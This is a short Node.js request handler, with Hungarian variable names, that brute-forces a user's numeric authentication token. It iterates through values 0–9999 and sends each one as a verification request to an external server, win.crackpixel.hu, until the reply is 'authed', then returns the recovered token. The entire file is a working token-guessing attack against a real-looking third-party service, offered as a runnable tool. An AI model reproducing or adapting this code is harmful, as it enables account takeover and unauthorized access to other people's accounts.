exports.run = async function (request, response,args) {
    let fetch = require("node-fetch")
    let tok = ""
    let tezes = 0
    let start = args.start ? Number(args.start) : 0
    let end = args.end ? Number(args.end) : 9999
    for (let i=start; i<end; i++) {
        tezes++
        let kacsa = await fetch("http://win.crackpixel.hu:1028/api?usr="+args.user+"&token="+i+"&mode=verify")
        let macska = await kacsa.text()

        console.log("kapotot: "+macska)
        if (macska == "authed") {
            response.end("UserToken :: "+i)
            return
        } else {
            if (tezes > 10) {
                console.log("TEZESTEZZ")
                response.write("Checked tokens: "+(Number(i)-11)+"-"+i+" :: not correct<br>")
                tezes = 0
            }

        }
    }
    response.end("Cannot determine token!")
}